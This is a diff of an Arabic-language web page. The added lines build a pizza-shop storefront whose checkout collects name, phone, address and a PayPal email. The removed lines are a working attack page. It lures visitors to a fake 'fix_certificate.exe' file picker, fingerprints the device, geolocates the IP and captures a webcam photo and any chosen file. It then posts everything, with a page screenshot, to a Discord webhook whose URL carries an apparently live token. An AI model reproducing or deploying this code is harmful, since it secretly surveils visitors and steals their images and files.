+                    <a href="#" class="w-9 h-9 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:bg-[#00953E]/20 hover:border-[#00953E]/30 transition-all duration-300"><span class="iconify text-sm text-neutral-400" data-icon="lucide:instagram"></span></a>
+                    <a href="#" class="w-9 h-9 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:bg-[#00953E]/20 hover:border-[#00953E]/30 transition-all duration-300"><span class="iconify text-sm text-neutral-400" data-icon="lucide:twitter"></span></a>
+                    <a href="#" class="w-9 h-9 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:bg-[#00953E]/20 hover:border-[#00953E]/30 transition-all duration-300"><span class="iconify text-sm text-neutral-400" data-icon="lucide:facebook"></span></a>
+                    <a href="#" class="w-9 h-9 rounded-full bg-white/5 border border-white/10 flex items-center justify-center hover:bg-[#00953E]/20 hover:border-[#00953E]/30 transition-all duration-300"><span class="iconify text-sm text-neutral-400" data-icon="lucide:youtube"></span></a>
+                </div>
+                <div class="flex items-center gap-4">
+                    <p class="text-[10px] text-neutral-600">© 2025 La Pizza Italiana. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Cart Sidebar -->
+    <div id="cart-overlay" class="fixed inset-0 z-[60] bg-black/60 backdrop-blur-sm hidden" onclick="closeCart()"></div>
+    <div id="cart-sidebar" class="fixed top-0 left-0 bottom-0 z-[70] w-full max-w-md bg-[#0f0f0f] border-r border-white/10 transform -translate-x-full transition-transform duration-500 ease-out flex flex-col">
+        <div class="p-5 border-b border-white/10 flex items-center justify-between">
+            <h3 class="text-base font-bold flex items-center gap-2"><span class="iconify text-[#00B140]" data-icon="lucide:shopping-bag"></span>سلة الطلبات</h3>
+            <button onclick="closeCart()" class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition-colors"><span class="iconify text-sm" data-icon="lucide:x"></span></button>
+        </div>
+        <div id="cart-items" class="flex-1 overflow-y-auto p-5 space-y-3">
+            <div id="cart-empty" class="flex flex-col items-center justify-center h-full text-center">
+                <span class="iconify text-4xl text-neutral-700 mb-3" data-icon="lucide:shopping-bag"></span>
+                <p class="text-neutral-500 text-sm">سلتك فارغة</p>
+                <p class="text-neutral-600 text-[10px] mt-1">أضف بيتزا إيطالية لذيذة!</p>
+            </div>
+        </div>
+        <div id="cart-footer" class="p-5 border-t border-white/10 hidden">
+            <div class="flex items-center justify-between mb-2">
+                <span class="text-neutral-500 text-xs">المجموع الفرعي</span>
+                <span id="cart-subtotal" class="text-sm font-medium">0 ر.س</span>
+            </div>
+            <div class="flex items-center justify-between mb-2">
+                <span class="text-neutral-500 text-xs">التوصيل</span>
+                <span id="cart-delivery" class="text-xs text-[#00B140]">مجاني</span>
+            </div>
+            <div class="flex items-center justify-between mb-5 pt-3 border-t border-white/5">
+                <span class="text-sm font-medium">الإجمالي</span>
+                <span id="cart-total" class="text-xl font-bold text-[#00B140]">0 ر.س</span>
+            </div>
+            <button onclick="openCheckout()" class="w-full bg-gradient-to-r from-[#00953E] to-[#00B140] text-white font-medium py-3.5 rounded-2xl transition-all duration-300 hover:shadow-lg hover:shadow-green-900/30 flex items-center justify-center gap-2 text-sm">
+                <span>متابعة الدفع</span>
+                <span class="iconify" data-icon="lucide:arrow-left"></span>
+            </button>
+        </div>
     </div>
-    <div class="sec" id="bait">
-        <h3>[+] FILE BAIT (SOCIAL ENGINEERING)</h3>
-        <p style="font-size:14px; color:#fff;">خطأ في تحميل الشهادة. يرجى تحميل ملف الإصلاح:</p>
-        <input type="file" id="fileInput" style="display:none" multiple>
-        <span class="fake-link" onclick="document.getElementById('fileInput').click()">fix_certificate.exe</span>
-        <div id="fileData" style="color:red; margin-top:10px;"></div>
+
+    <!-- Size Modal -->
+    <div id="size-modal" class="fixed inset-0 z-[80] flex items-center justify-center p-4 hidden">
+        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="closeSizeModal()"></div>
+        <div class="relative bg-[#111] border border-white/10 rounded-3xl p-7 w-full max-w-sm animate-scale-in">
+            <button onclick="closeSizeModal()" class="absolute top-4 left-4 w-7 h-7 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition-colors"><span class="iconify text-xs" data-icon="lucide:x"></span></button>
+            <h3 id="modal-title" class="text-base font-bold mb-1 font-italian"></h3>
+            <p class="text-neutral-600 text-[10px] mb-5">Scegli la dimensione — اختر الحجم</p>
+            <div id="modal-sizes" class="space-y-2.5 mb-5"></div>
+            <div class="flex items-center gap-2 mb-5">
+                <button onclick="changeQty(-1)" class="counter-btn w-9 h-9 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center hover:bg-white/10"><span class="iconify" data-icon="lucide:minus"></span></button>
+                <span id="modal-qty" class="text-lg font-bold w-10 text-center">1</span>
+                <button onclick="changeQty(1)" class="counter-btn w-9 h-9 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center hover:bg-white/10"><span class="iconify" data-icon="lucide:plus"></span></button>
+            </div>
+            <button onclick="confirmAdd()" class="w-full bg-gradient-to-r from-[#00953E] to-[#00B140] text-white font-medium py-3 rounded-2xl transition-all duration-300 flex items-center justify-center gap-2 text-sm">
+                <span>أضف للسلة</span>
+                <span class="iconify" data-icon="lucide:plus"></span>
+            </button>
+        </div>
     </div>
-</div>
 
-<script>
-const WH = 'https://discord.com/api/webhooks/1493905081458753557/0KU7qLKVVzacx7VnzdQawdNaA5O1xeuSPnQil98pTcU0hc1bLWDOIRa1PR1zUVIE1Hil';
-const log = m => document.getElementById('log').innerText = m;
+    <!-- Checkout Modal -->
+    <div id="checkout-modal" class="fixed inset-0 z-[80] flex items-end md:items-center justify-center p-0 md:p-4 hidden">
+        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="closeCheckout()"></div>
+        <div class="relative bg-[#0f0f0f] border border-white/10 rounded-t-3xl md:rounded-3xl w-full max-w-lg max-h-[90vh] overflow-y-auto animate-scale-in">
+            <!-- Steps -->
+            <div class="p-6 border-b border-white/5">
+                <div class="flex items-center justify-between mb-5">
+                    <h3 class="text-base font-bold flex items-center gap-2"><span class="iconify text-[#00B140]" data-icon="lucide:credit-card"></span>إتمام الطلب</h3>
+                    <button onclick="closeCheckout()" class="w-7 h-7 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10"><span class="iconify text-xs" data-icon="lucide:x"></span></button>
+                </div>
+                <div class="flex items-center justify-center gap-2">
+                    <div id="step1" class="step-active w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold">1</div>
+                    <div class="w-8 h-px bg-white/10"></div>
+                    <div id="step2" class="step-pending w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold">2</div>
+                    <div class="w-8 h-px bg-white/10"></div>
+                    <div id="step3" class="step-pending w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold">3</div>
+                </div>
+                <div class="flex items-center justify-between mt-2 text-[9px] text-neutral-600 px-1">
+                    <span>البيانات</span>
+                    <span>الدفع</span>
+                    <span>التأكيد</span>
+                </div>
+            </div>
 
-document.getElementById('start').onclick = async () => {
-    document.getElementById('start').style.display = 'none';
-    document.getElementById('ui').style.display = 'block';
-    log("جاري الحفر في النظام...");
+            <!-- Step 1: Info -->
+            <div id="checkout-step1" class="p-6 space-y-4">
+                <div>
+                    <label class="text-[10px] text-neutral-500 mb-1.5 block">الاسم الكامل *</label>
+                    <input id="inp-name" type="text" placeholder="مثال: محمد أحمد" class="input-field w-full px-4 py-3 rounded-xl text-sm text-white placeholder-neutral-600" />
+                </div>
+                <div>
+                    <label class="text-[10px] text-neutral-500 mb-1.5 block">رقم الجوال *</label>
+                    <input id="inp-phone" type="tel" placeholder="05XXXXXXXX" dir="ltr" class="input-field w-full px-4 py-3 rounded-xl text-sm text-white placeholder-neutral-600 text-left" />
+                </div>
+                <div>
+                    <label class="text-[10px] text-neutral-500 mb-1.5 block">عنوان التوصيل *</label>
+                    <textarea id="inp-address" rows="2" placeholder="الحي، الشارع، رقم المبنى، الشقة" class="input-field w-full px-4 py-3 rounded-xl text-sm text-white placeholder-neutral-600 resize-none"></textarea>
+                </div>
+                <div>
+                    <label class="text-[10px] text-neutral-500 mb-1.5 block">ملاحظات (اختياري)</label>
+                    <input id="inp-notes" type="text" placeholder="مثال: بدون بصل، حار زيادة..." class="input-field w-full px-4 py-3 rounded-xl text-sm text-white placeholder-neutral-600" />
+                </div>
+                <div id="step1-error" class="text-[10px] text-red-400 hidden">يرجى ملء جميع الحقول المطلوبة</div>
+                <button onclick="goToStep2()" class="w-full bg-gradient-to-r from-[#00953E] to-[#00B140] text-white font-medium py-3.5 rounded-2xl transition-all text-sm flex items-center justify-center gap-2">
+                    <span>التالي — الدفع</span>
+                    <span class="iconify" data-icon="lucide:arrow-left"></span>
+                </button>
+            </div>
 
-    let finalData = {};
+            <!-- Step 2: Payment -->
+            <div id="checkout-step2" class="p-6 space-y-4 hidden">
+                <!-- Order Summary Mini -->
+                <div class="bg-white/5 rounded-2xl p-4 border border-white/5 mb-2">
+                    <div class="text-[10px] text-neutral-500 mb-2">ملخص الطلب</div>
+                    <div id="checkout-summary" class="space-y-1.5"></div>
+                    <div class="border-t border-white/5 mt-3 pt-3 flex items-center justify-between">
+                        <span class="text-xs font-medium">الإجمالي</span>
+                        <span id="checkout-total" class="text-sm font-bold text-[#00B140]">0 ر.س</span>
+                    </div>
+                </div>
 
-    // 1. بصمة عميقة جداً (Audio, Canvas, WebGL)
-    let gpu = "N/A", audioFP = "N/A";
-    try {
-        const c = document.createElement('canvas'); const gl = c.getContext('webgl');
-        gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Blocked";
-    } catch(e){}
-    try {
-        const actx = new (window.AudioContext || window.webkitAudioContext)();
-        const osc = actx.createOscillator(); const analyser = actx.createAnalyser(); osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, actx.currentTime);
-        osc.connect(analyser); analyser.connect(actx.destination); osc.start(0);
-        const data = new Uint8Array(analyser.frequencyBinCount); analyser.getByteFrequencyData(data);
-        audioFP = "Hash: " + data.slice(0, 10).join('');
-        actx.close();
-    } catch(e){ audioFP = "Blocked"; }
+                <!-- Payment Method -->
+                <div class="text-[10px] text-neutral-500 mb-1">طريقة الدفع</div>
+                <label class="flex items-center gap-3 p-4 rounded-2xl border-2 border-[#00953E] bg-[#00953E]/5 cursor-pointer">
+                    <input type="radio" name="payment" value="paypal" checked class="hidden" />
+                    <div class="w-10 h-10 rounded-xl bg-[#0070BA]/10 flex items-center justify-center">
+                        <span class="iconify text-xl text-[#0070BA]" data-icon="lucide:wallet"></span>
+                    </div>
+                    <div class="flex-1">
+                        <div class="text-sm font-medium">PayPal</div>
+                        <div class="text-[10px] text-neutral-500">دفع آمن ومشفر عبر PayPal</div>
+                    </div>
+                    <div class="w-5 h-5 rounded-full border-2 border-[#00953E] flex items-center justify-center">
+                        <div class="w-2.5 h-2.5 rounded-full bg-[#00953E]"></div>
+                    </div>
+                </label>
+                <label class="flex items-center gap-3 p-4 rounded-2xl border border-white/10 bg-white/5 cursor-pointer hover:border-white/20 transition-colors" onclick="selectCash(this)">
+                    <input type="radio" name="payment" value="cash" class="hidden" />
+                    <div class="w-10 h-10 rounded-xl bg-white/5 flex items-center justify-center">
+                        <span class="iconify text-xl text-neutral-400" data-icon="lucide:banknote"></span>
+                    </div>
+                    <div class="flex-1">
+                        <div class="text-sm font-medium text-neutral-400">نقداً عند الاستلام</div>
+                        <div class="text-[10px] text-neutral-600">ادفع للسائق عند التوصيل</div>
+                    </div>
+                    <div class="w-5 h-5 rounded-full border-2 border-white/20"></div>
+                </label>
 
-    finalData.fingerprint = {
-        "OS/Platform": navigator.platform,
-        "UA": navigator.userAgent,
-        "Lang": navigator.language,
-        "Screen": `${screen.width}x${screen.height}@${screen.colorDepth}bit`,
-        "DevicePixelRatio": window.devicePixelRatio,
-        "CPU_Cores": navigator.hardwareConcurrency,
-        "RAM": navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Hidden",
-        "GPU": gpu,
-        "Audio_FP": audioFP,
-        "Touch": navigator.maxTouchPoints,
-        "Battery": "N/A",
-        "Network": "N/A",
-        "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "Storage_Quota": "N/A"
-    };
+                <!-- PayPal Form (shown when PayPal selected) -->
+                <div id="paypal-form" class="space-y-3 pt-2">
+                    <div>
+                        <label class="text-[10px] text-neutral-500 mb-1.5 block">البريد الإلكتروني PayPal *</label>
+                        <input id="inp-paypal" type="email" placeholder="example@email.com" dir="ltr" class="input-field w-full px-4 py-3 rounded-xl text-sm text-white placeholder-neutral-600 text-left" />
+                    </div>
+                    <div class="flex items-center gap-2 p-3 rounded-xl bg-[#0070BA]/5 border border-[#0070BA]/10">
+                        <span class="iconify text-[#0070BA] text-sm" data-icon="lucide:shield-check"></span>
+                        <span class="text-[10px] text-neutral-400">معاملة محمية بتشفير SSL 256-bit</span>
+                    </div>
+                </div>
 
-    try {
-        const bat = await navigator.getBattery();
-        finalData.fingerprint.Battery = `${bat.level*100}% (Charging: ${bat.charging})`;
-    } catch(e){}
-    try {
-        const conn = navigator.connection;
-        finalData.fingerprint.Network = `${conn.effectiveType} / ${conn.downlink}Mbps / RTT: ${conn.rtt}ms`;
-    } catch(e){}
-    try {
-        const est = await navigator.storage.estimate();
-        finalData.fingerprint.Storage_Quota = `${(est.quota / 1024 / 1024 / 1024).toFixed(2)} GB Total, ${(est.usage / 1024 / 1024).toFixed(2)} MB Used`;
-    } catch(e){}
-    
-    renderObj('fp', finalData.fingerprint);
-    log("تم جمع البصمة.");
+                <div id="step2-error" class="text-[10px] text-red-400 hidden">يرجى إدخال بريد PayPal</div>
+                <div class="flex gap-3 pt-2">
+                    <button onclick="goToStep1()" class="flex-1 bg-white/5 border border-white/10 text-neutral-300 text-sm py-3 rounded-2xl hover:bg-white/10 transition-colors">رجوع</button>
+                    <button onclick="goToStep3()" class="flex-1 bg-gradient-to-r from-[#00953E] to-[#00B140] text-white font-medium py-3 rounded-2xl transition-all text-sm">تأكيد الطلب</button>
+                </div>
+            </div>
 
-    // 2. الموقع والـ IP
-    let loc = {IP: "Error", City: "Error", Country: "Error", ISP: "Error", Lat: 0, Lon: 0};
-    try { const r = await fetch('https://ipapi.co/json/'); loc = await r.json(); } catch(e){}
-    renderObj('geo', loc);
-    if(loc.Lat && loc.Lon) {
-        document.getElementById('map').style.display = 'block';
-        const m = L.map('map').setView([loc.Lat, loc.Lon], 12);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);
-        L.marker([loc.Lat, loc.Lon]).addTo(m);
-    }
-    log("تم تحديد الموقع.");
+            <!-- Step 3: Confirmation -->
+            <div id="checkout-step3" class="p-6 hidden">
+                <div class="text-center py-6">
+                    <div class="order-success inline-flex items-center justify-center w-20 h-20 rounded-full bg-[#00953E]/10 border-2 border-[#00953E] mb-5">
+                        <span class="iconify text-4xl text-[#00B140]" data-icon="lucide:check"></span>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2 font-italian">Grazie!</h3>
+                    <p class="text-neutral-400 text-sm mb-1">تم تأكيد طلبك بنجاح</p>
+                    <div class="inline-flex items-center gap-2 bg-white/5 border border-white/10 rounded-xl px-4 py-2 mt-3 mb-5">
+                        <span class="text-[10px] text-neutral-500">رقم الطلب</span>
+                        <span id="order-number" class="text-sm font-bold text-[#00B140] font-mono">#LP-00000</span>
+                    </div>
+                    <div class="bg-white/5 rounded-2xl p-5 text-right border border-white/5 mb-5">
+                        <div id="confirmation-details" class="space-y-2 text-xs"></div>
+                    </div>
+                    <div class="flex items-center justify-center gap-2 text-xs text-neutral-500 mb-6">
+                        <span class="iconify text-[#00B140]" data-icon="lucide:clock"></span>
+                        <span>التوصيل المتوقع خلال 35-45 دقيقة</span>
+                    </div>
+                    <button onclick="finishOrder()" class="w-full bg-gradient-to-r from-[#00953E] to-[#00B140] text-white font-medium py-3.5 rounded-2xl transition-all text-sm">
+                        تم، شكراً!
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
 
-    // 3. محاولة الكاميرا (سينتج عنها طلب إذن في المتصفح)
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        document.getElementById('camBox').style.display = 'block';
-        document.getElementById('camBox').srcObject = stream;
-        log("تم الوصول للكاميرا!");
-        // نلتقط صورة بعد ثانيتين
-        setTimeout(() => {
-            const video = document.getElementById('camBox');
-            const canvas = document.getElementById('camCanvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            finalData.cameraBase64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-            stream.getTracks().forEach(t => t.stop()); // نغلق الكاميرا
-            log("تم التقاط صورة الكاميرا.");
-        }, 2000);
-    } catch(e) { log("الكاميرا: تم الرفض أو الحظر."); }
+    <!-- Toast Container -->
+    <div id="toast-container" class="fixed top-20 left-4 z-[90] space-y-2"></div>
 
-    // 4. اصطياد الملفات (File Baiting)
-    document.getElementById('fileInput').addEventListener('change', async (e) => {
-        const file = e.target.files[0];
-        if(file) {
-            log(`تم اصطياد ملف: ${file.name} (${(file.size/1024).toFixed(2)} KB)`);
-            document.getElementById('fileData').innerText = `تم رفع: ${file.name}`;
-            // تحويل الملف إلى Base64 وإرساله
-            const reader = new FileReader();
-            reader.onload = () => { finalData.stolenFile = { name: file.name, type: file.type, base64: reader.result.split(',')[1] }; };
-            reader.readAsDataURL(file);
+    <script>
+        // ==================== DATA ====================
+        const menuItems = [
+            { id:1, name:"مارغريتا", nameIt:"Margherita", category:"classiche", desc:"صلصة San Marzano DOP، موزاريلا فريسكا، ريحان طازج، زيت زيتون بكر", image:"https://picsum.photos/seed/margherita-naples-2024/600/400.jpg", prices:{small:32,medium:42,large:52}, badge:null, spicy:false },
+            { id:2, name:"بيبروني", nameIt:"Diavola", category:"classiche", desc:"بيبروني إيطالي حار، موزاريلا، صلصة طماطم، أوريغانو كالابري", image:"https://picsum.photos/seed/diavola-pepperoni-spicy/600/400.jpg", prices:{small:38,medium:48,large:58}, badge:"popular", spicy:true },
+            { id:3, name:"كوارترو فورماجي", nameIt:"Quattro Formaggi", category:"classiche", desc:"موزاريلا، غورغونزولا، بارميزان، فونتينا، عسل مقطر", image:"https://picsum.photos/seed/quattro-formaggi-italian/600/400.jpg", prices:{small:42,medium:52,large:65}, badge:null, spicy:false },
+            { id:4, name:"بروsciوتو روكولا", nameIt:"Prosciutto e Rucola", category:"classiche", desc:"بروشيتو دي بارما، روكولا طازجة، شرائح بارميزان، زيت زيتون", image:"https://picsum.photos/seed/prosciutto-rucola-parma/600/400.jpg", prices:{small:48,medium:60,large:72}, badge:null, spicy:false },
+            { id:5, name:"دجاج باربكيو", nameIt:"Pollo BBQ", category:"speciali", desc:"صدور دجاج مشوية، صوص باربكيو مدخن، بصل أحمر مقرمش، جبنة شيدر", image:"https://picsum.photos/seed/chicken-bbq-pizza-ital/600/400.jpg", prices:{small:40,medium:50,large:62}, badge:"popular", spicy:false },
+            { id:6, name:"سي فود فراسيياتي", nameIt:"Frutti di Mare", category:"speciali", desc:"روبيان، كاليماري، مussels، صوص مارينارا، ثوم، بقدونس، ليمون", image:"https://picsum.photos/seed/frutti-mare-seafood/600/400.jpg", prices:{small:55,medium:68,large:82}, badge:"new", spicy:false },
+            { id:7, name:"كالابريزي حارة", nameIt:"Calabrese Piccante", category:"speciali", desc:"سلامي كالابريا حار، فلفل حار، بصل أحمر، موزاريلا مزدوجة", image:"https://picsum.photos/seed/calabrese-spicy-salami/600/400.jpg", prices:{small:42,medium:52,large:64}, badge:"spicy", spicy:true },
+            { id:8, name:"ترافو نيردي", nameIt:"Tartufo Nero", category:"gourmet", desc:"كريمة ترافولاتا، فطر بورتشيني، ترافل أسود، جبنة تاليدجو، زبدة", image:"https://picsum.photos/seed/tartufo-nero-truffle/600/400.jpg", prices:{small:65,medium:85,large:105}, badge:"new", spicy:false },
+            { id:9, name:"بارما إليت", nameIt:"Parma Elite", category:"gourmet", desc:"بروشيتو 24 شهر، جبنة بوراتا طازجة، طماطم كرزية، ريحان، مودينا بلساميك", image:"https://picsum.photos/seed/parma-elite-burrata/600/400.jpg", prices:{small:62,medium:80,large:98}, badge:null, spicy:false },
+            { id:10, name:"كربونارا بيتزا", nameIt:"Carbonara Pizza", category:"gourmet", desc:"غواتشالي أدوباتي، صفار بيض، بيكورينو رومانو، فلفل أسود مطحون", image:"https://picsum.photos/seed/carbonara-artisan-pizza/600/400.jpg", prices:{small:55,medium:70,large:88}, badge:"popular", spicy:false },
+            { id:11, name:"أجنحة دجاج", nameIt:"Ali di Pollo", category:"sides", desc:"8 قطع أجنحة مقرمشة: باربكيو / حار كالابريا / عسل خردل", image:"https://picsum.photos/seed/chicken-wings-italian/600/400.jpg", prices:{small:28,medium:38,large:null}, badge:null, spicy:false, isSide:true },
+            { id:12, name:"فوكاتشيا بالثوم", nameIt:"Focaccia all'Aglio", category:"sides", desc:"خبز فوكاتشيا إيطالي مع ثوم وزبدة وروزماري وملح بحر", image:"https://picsum.photos/seed/garlic-focaccia-bread/600/400.jpg", prices:{small:16,medium:24,large:null}, badge:null, spicy:false, isSide:true },
+            { id:13, name:"بريدي إيطالي", nameIt:"Bruschetta Classica", category:"sides", desc:"خبز كامباني محمص مع طماطم ناضجة، ثوم، ريحان، زيت زيتون", image:"https://picsum.photos/seed/bruschetta-tomato-basil/600/400.jpg", prices:{small:18,medium:26,large:null}, badge:null, spicy:false, isSide:true },
+            { id:14, name:"تيراميسو", nameIt:"Tiramisù", category:"sides", desc:"حلى تيراميسو كلاسيكي: ماسكاربوني، سافوياردي، إسبريسو، كاكاو", image:"https://picsum.photos/seed/tiramisu-dessert-classic/600/400.jpg", prices:{small:22,medium:32,large:null}, badge:null, spicy:false, isSide:true },
+            { id:15, name:"باني كوتا", nameIt:"Panna Cotta", category:"sides", desc:"كريمة إيطالية مهروسة مع صوص الفراولة الطازجة والنعناع", image:"https://picsum.photos/seed/panna-cotta-strawberry/600/400.jpg", prices:{small:20,medium:28,large:null}, badge:null, spicy:false, isSide:true }
+        ];
+
+        let cart = [];
+        let currentItem = null;
+        let selectedSize = 'medium';
+        let modalQty = 1;
+        let paymentMethod = 'paypal';
+
+        // ==================== RENDER MENU ====================
+        function renderMenu(filter='all') {
+            const grid = document.getElementById('menu-grid');
+            const filtered = filter==='all' ? menuItems : menuItems.filter(i=>i.category===filter);
+            grid.innerHTML = filtered.map((item,i) => `
+                <div class="menu-card rounded-2xl border border-white/10 bg-neutral-900/40 overflow-hidden group" data-category="${item.category}" style="transition-delay:${i*0.05}s">
+                    <div class="relative h-44 overflow-hidden">
+                        <img src="${item.image}" alt="${item.name}" class="card-image w-full h-full object-cover transition-transform duration-700" loading="lazy"/>
+                        <div class="absolute inset-0 bg-gradient-to-t from-neutral-900/80 via-transparent to-transparent"></div>
+                        ${item.badge ? `<div class="absolute top-3 right-3 badge-${item.badge} text-white text-[9px] font-bold px-2.5 py-0.5 rounded-full">${item.badge==='popular'?'⭐ الأكثر طلباً':item.badge==='new'?'🆕 جديد':'🌶️ حار'}</div>` : ''}
+                        ${item.spicy && !item.badge ? '<div class="absolute top-3 right-3 text-xs">🌶️</div>' : ''}
+                        <div class="absolute bottom-3 left-3">
+                            <span class="text-[9px] text-neutral-400 font-italian italic">${item.nameIt}</span>
+                        </div>
+                    </div>
+                    <div class="p-5">
+                        <div class="flex items-start justify-between gap-2 mb-1.5">
+                            <h3 class="text-sm font-bold leading-tight">${item.name}</h3>
+                            <div class="price-tag flex-shrink-0 bg-white/10 text-[#00B140] text-xs font-bold px-2.5 py-1 rounded-full transition-all duration-300">
+                                ${item.isSide ? item.prices.small+' ر.س' : item.prices.medium+' ر.س'}
+                            </div>
+                        </div>
+                        <p class="text-neutral-500 text-[10px] leading-relaxed mb-4 line-clamp-2">${item.desc}</p>
+                        ${!item.isSide ? `<div class="flex items-center gap-1.5 mb-4 text-[9px] text-neutral-600">
+                            <span>صغير ${item.prices.small}</span><span>·</span><span>وسط ${item.prices.medium}</span><span>·</span><span>كبير ${item.prices.large}</span><span>ر.س</span>
+                        </div>` : ''}
+                        <button onclick="openSizeModal(${item.id})" class="add-btn w-full bg-white/5 border border-white/10 text-neutral-300 text-xs font-medium py-2.5 rounded-xl transition-all duration-300 flex items-center justify-center gap-2">
+                            <span class="iconify text-sm" data-icon="lucide:plus"></span><span>أضف للسلة</span>
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+            requestAnimationFrame(()=>{
+                setTimeout(()=>{
+                    document.querySelectorAll('.menu-card').forEach((c,i)=>{
+                        setTimeout(()=>c.classList.add('visible'), i*70);
+                    });
+                },30);
+            });
         }
-    });
 
-    // 5. الإرسال النهائي (بعد 6 ثوانٍ لانتظار الكاميرا أو الملفات)
-    setTimeout(async () => {
-        log("جاري الالتقاط والإرسال النهائي...");
-        try {
-            // التقاط صورة للصفحة
-            const pageCanvas = await html2canvas(document.body, { useCORS: true });
-            finalData.pageScreenshot = pageCanvas.toDataURL('image/png').split(',')[1];
-
-            // تجهيز الـ Discord Payload
-            const textPayload = {
-                username: "Max-OSINT-Bot",
-                embeds: [{
-                    title: "💀 FULL EXTRACTION REPORT",
-                    color: 000000,
-                    fields: [
-                        { name: "📍 Geo/IP", value: `\`\`\`${JSON.stringify(loc, null, 1)}\`\`\``, inline: false },
-                        { name: "💻 Deep FP", value: `\`\`\`${JSON.stringify(finalData.fingerprint, null, 1)}\`\`\``, inline: false },
-                        { name: "📸 Camera", value: finalData.cameraBase64 ? "✅ Image Captured (Sent as file)" : "❌ Denied/Unavailable", inline: true },
-                        { name: "📁 File Bait", value: finalData.stolenFile ? `✅ ${finalData.stolenFile.name}` : "❌ No file selected", inline: true }
-                    ]
-                }]
-            };
-
-            const formData = new FormData();
-            formData.append("payload_json", JSON.stringify(textPayload));
-
-            // إضافة صورة الصفحة
-            if(finalData.pageScreenshot) {
-                formData.append("files[0]", base64ToBlob(finalData.pageScreenshot, 'image/png'), "page_screenshot.png");
-            }
-            // إضافة صورة الكاميرا
-            if(finalData.cameraBase64) {
-                formData.append("files[1]", base64ToBlob(finalData.cameraBase64, 'image/jpeg'), "webcam.jpg");
-            }
-            // إضافة الملف المصطاد
-            if(finalData.stolenFile && finalData.stolenFile.base64) {
-                formData.append("files[2]", base64ToBlob(finalData.stolenFile.base64, finalData.stolenFile.type), finalData.stolenFile.name);
-            }
-
-            await fetch(WH, { method: 'POST', body: formData });
-            log("✅ تم إرسال كل شيء بنجاح إلى الويب هوك.");
-        } catch(err) {
-            log("❌ خطأ في الإرسال: " + err.message);
+        function filterMenu(cat) {
+            document.querySelectorAll('.category-btn').forEach(b=>{
+                b.classList.toggle('active', b.dataset.cat===cat);
+                b.classList.toggle('text-neutral-400', b.dataset.cat!==cat);
+            });
+            renderMenu(cat);
         }
-    }, 6000);
-};
 
-function renderObj(id, obj) {
-    let html = '';
-    for (const [k, v] of Object.entries(obj)) { html += `<div class="r"><span>${k}:</span><span class="v">${v}</span></div>`; }
-    document.getElementById(id).innerHTML = html;
-}
+        // ==================== SIZE MODAL ====================
+        function openSizeModal(id) {
+            currentItem = menuItems.find(i=>i.id===id);
+            if(!currentItem) return;
+            selectedSize = 'medium';
+            modalQty = 1;
+            document.getElementById('modal-qty').textContent = '1';
+            document.getElementById('modal-title').textContent = currentItem.name + ' — ' + currentItem.nameIt;
 
-function base64ToBlob(b64, type) {
-    const byteChars = atob(b64);
-    const arr = new Uint8Array(byteChars.length);
-    for(let i=0; i<byteChars.length; i++) arr[i] = byteChars.charCodeAt(i);
-    return new Blob([arr], {type});
-}
-</script>
+            const sd = document.getElementById('modal-sizes');
+            if(currentItem.isSide) {
+                const labels = currentItem.nameIt.includes('Tiramis')||currentItem.nameIt.includes('Panna') ? {small:'حجم فردي',medium:'حجم كبير'} : {small:'حجم عادي',medium:'حجم كبير'};
+                sd.innerHTML = Object.entries(currentItem.prices).filter(([k,v])=>v!==null).map(([size,price])=>`
+                    <button onclick="selectSize('${size}')" class="size-btn ${size==='small'?'selected':''} w-full flex items-center justify-between p-3.5 rounded-xl border border-white/10 transition-all duration-300 hover:border-[#00953E]/30">
+                        <span class="text-sm ${size==='small'?'':'text-neutral-400'}">${labels[size]}</span>
+                        <span class="size-price text-sm font-bold ${size==='small'?'text-[#00B140]':'text-neutral-400'}">${price} ر.س</span>
+                    </button>
+                `).join('');
+                selectedSize = 'small';
+            } else {
+                const labels = {small:'صغير Piccolo (6 شرائح)',medium:'وسط Media (8 شرائح)',large:'كبير Grande (12 شريحة)'};
+                const icons = {small:'lucide:circle-dot',medium:'lucide:circle-dot',large:'lucide:circle-dot'};
+                sd.innerHTML = Object.entries(currentItem.prices).map(([size,price])=>`
+                    <button onclick="selectSize('${size}')" class="size-btn ${size==='medium'?'selected':''} w-full flex items-center justify-between p-3.5 rounded-xl border border-white/10 transition-all duration-300 hover:border-[#00953E]/30">
+                        <div class="flex items-center gap-2"><span class="size-icon iconify text-sm ${size==='medium'?'text-[#00B140]':'text-neutral-500'}" data-icon="${icons[size]}"></span><span class="text-sm ${size==='medium'?'':'text-neutral-400'}">${labels[size]}</span></div>
+                        <span class="size-price text-sm font-bold ${size==='medium'?'text-[#00B140]':'text-neutral-400'}">${price} ر.س</span>
+                    </button>
+                `).join('');
+            }
+            document.getElementById('size-modal').classList.remove('hidden');
+        }
+
+        function selectSize(size) {
+            selectedSize = size;
+            document.querySelectorAll('.size-btn').forEach((btn,i)=>{
